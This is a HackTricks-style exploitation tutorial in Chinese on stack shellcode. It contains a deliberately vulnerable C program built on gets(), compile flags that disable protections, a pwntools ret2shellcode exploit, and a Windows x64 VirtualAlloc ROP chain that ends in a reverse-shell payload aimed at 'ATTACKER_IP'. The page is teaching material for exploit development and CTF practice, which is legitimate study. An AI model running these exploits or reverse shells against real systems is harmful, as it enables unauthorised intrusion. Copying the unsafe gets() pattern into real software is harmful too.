# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

**Stack shellcode** 是一种用于 **binary exploitation** 的技术，攻击者将 shellcode 写入易受攻击程序的栈，然后修改 **Instruction Pointer (IP)** 或 **Extended Instruction Pointer (EIP)**，使其指向该 shellcode 的位置，从而导致其执行。这是一种经典方法，用于在目标系统上获取未授权访问或执行任意命令。下面分解该过程，包括一个简单的 C 示例以及如何使用 Python 和 **pwntools** 编写相应的 exploit。

### C 示例：一个易受攻击的程序

让我们从一个简单的易受攻击的 C 程序示例开始：
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
该程序因为使用 `gets()` 函数而容易受到缓冲区溢出攻击。

### 编译

要在禁用各种保护（以模拟易受攻击的环境）的情况下编译此程序，可以使用以下命令：
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: 禁用栈保护。
- `-z execstack`: 使栈可执行，这对于执行存放在栈上的 shellcode 是必要的。
- `-no-pie`: 禁用 Position Independent Executable，使我们更容易预测 shellcode 将所在的内存地址。
- `-m32`: 将程序编译为 32 位可执行文件，常用于简化 exploit 开发。

### 使用 Pwntools 的 Python Exploit

下面是如何使用 **pwntools** 在 Python 中编写 exploit 以执行 **ret2shellcode** 攻击：
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
该脚本构造了一个 payload，包含 **NOP slide**、**shellcode**，然后将 **EIP** 覆盖为指向 NOP slide 的地址，以确保 shellcode 被执行。

**NOP slide** (`asm('nop')`) 用来增加执行“滑入”我们 shellcode 的几率，而不依赖精确地址。调整 `p32()` 的参数为你的缓冲区起始地址加上一个偏移，以落在 NOP slide 上。

## Windows x64: 绕过 NX，使用 VirtualAlloc ROP (ret2stack shellcode)

在现代 Windows 上，stack 是 non-executable（DEP/NX）。在发生 stack BOF 后仍想执行驻留在栈上的 shellcode 的常用方法是构建一个 64-bit ROP chain，从模块的 Import Address Table (IAT) 调用 VirtualAlloc（或 VirtualProtect），使栈上的某个区域变为可执行，然后返回到紧随该链之后的 shellcode。

Key points (Win64 calling convention):
- VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
- RCX = lpAddress → 选择当前栈中的一个地址（例如 RSP），这样新分配的 RWX 区域会与你的 payload 重叠
- RDX = dwSize → 足够容纳你的 chain + shellcode（例如 0x1000）
- R8  = flAllocationType = MEM_COMMIT (0x1000)
- R9  = flProtect = PAGE_EXECUTE_READWRITE (0x40)
- Return directly into the shellcode placed right after the chain.

Minimal strategy:
1) Leak a module base（例如通过 format-string、object pointer 等）以便在 ASLR 下计算出绝对 gadget 和 IAT 地址。
2) 找到用于加载 RCX/RDX/R8/R9 的 gadgets（pop 或 mov/xor 类序列）以及可 call/jmp [VirtualAlloc@IAT] 的 gadget。如果没有直接的 pop r8/r9，使用算术 gadgets 来合成常量（例如，将 r8 设为 0，然后重复将 r9 加 0x40 四十次以达到 0x1000）。
3) 将 stage-2 shellcode 放置在链之后紧接的位置。

Example layout (conceptual):
```
# ... padding up to saved RIP ...
# R9 = 0x40 (PAGE_EXECUTE_READWRITE)
POP_R9_RET; 0x40
# R8 = 0x1000 (MEM_COMMIT) — if no POP R8, derive via arithmetic
POP_R8_RET; 0x1000
# RCX = &stack (lpAddress)
LEA_RCX_RSP_RET    # or sequence: load RSP into a GPR then mov rcx, reg
# RDX = size (dwSize)
POP_RDX_RET; 0x1000
# Call VirtualAlloc via the IAT
[IAT_VirtualAlloc]
# New RWX memory at RCX — execution continues at the next stack qword
JMP_SHELLCODE_OR_RET
# ---- stage-2 shellcode (x64) ----
```
在受限的 gadget 集合下，你可以间接构造寄存器的值，例如：
- mov r9, rbx; mov r8, 0; add rsp, 8; ret → 将 r9 设为 rbx 的值，将 r8 清零，并用一个垃圾 qword 补偿栈。
- xor rbx, rsp; ret → 用当前的栈指针为 rbx 赋值。
- push rbx; pop rax; mov rcx, rax; ret → 将来源于 RSP 的值移动到 RCX。

Pwntools 示例（在已知基址和 gadgets 的情况下）：
```python
from pwn import *
base = 0x7ff6693b0000
IAT_VirtualAlloc = base + 0x400000  # example: resolve via reversing
rop  = b''
# r9 = 0x40
rop += p64(base+POP_RBX_RET) + p64(0x40)
rop += p64(base+MOV_R9_RBX_ZERO_R8_ADD_RSP_8_RET) + b'JUNKJUNK'
# rcx = rsp
rop += p64(base+POP_RBX_RET) + p64(0)
rop += p64(base+XOR_RBX_RSP_RET)
rop += p64(base+PUSH_RBX_POP_RAX_RET)
rop += p64(base+MOV_RCX_RAX_RET)
# r8 = 0x1000 via arithmetic if no pop r8
for _ in range(0x1000//0x40):
rop += p64(base+ADD_R8_R9_ADD_RAX_R8_RET)
# rdx = 0x1000 (use any available gadget)
rop += p64(base+POP_RDX_RET) + p64(0x1000)
# call VirtualAlloc and land in shellcode
rop += p64(IAT_VirtualAlloc)
rop += asm(shellcraft.amd64.windows.reverse_tcp("ATTACKER_IP", ATTACKER_PORT))
```
提示：
- VirtualProtect 的工作方式类似，如果更倾向于将现有缓冲区设为 RX；参数顺序不同。
- 如果 stack 空间不足，在别处分配 RWX（RCX=NULL）并 jmp 到该新区域，而不是重用 stack。
- 始终考虑会调整 RSP 的 gadgets（例如 add rsp, 8; ret），通过插入垃圾 qwords 来补偿。


- [**ASLR**](../../common-binary-protections-and-bypasses/aslr/index.html) **应该被禁用**，以使地址在不同执行中可靠，否则函数将被存放的地址不会总是相同，你将需要一些 leak 来确定 win 函数加载在哪里。
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) 也应被禁用，否则被破坏的 EIP 返回地址将永远不会被执行。
- [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **stack** 保护会阻止在 stack 内的 shellcode 执行，因为该区域不会是可执行的。

## 其他示例与参考

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64bit，ASLR，有 stack 地址 leak，写入 shellcode 并 jump 到它
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 bit，ASLR，stack leak，写入 shellcode 并 jump 到它
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 bit，ASLR，stack leak，通过比较防止调用 exit()，覆盖变量为某值并写入 shellcode 并 jump 到它
- [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
- arm64，无 ASLR，使用 ROP gadget 使 stack 可执行并 jump 到 stack 中的 shellcode


## References

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [VirtualAlloc documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

{{#include ../../../banners/hacktricks-training.md}}
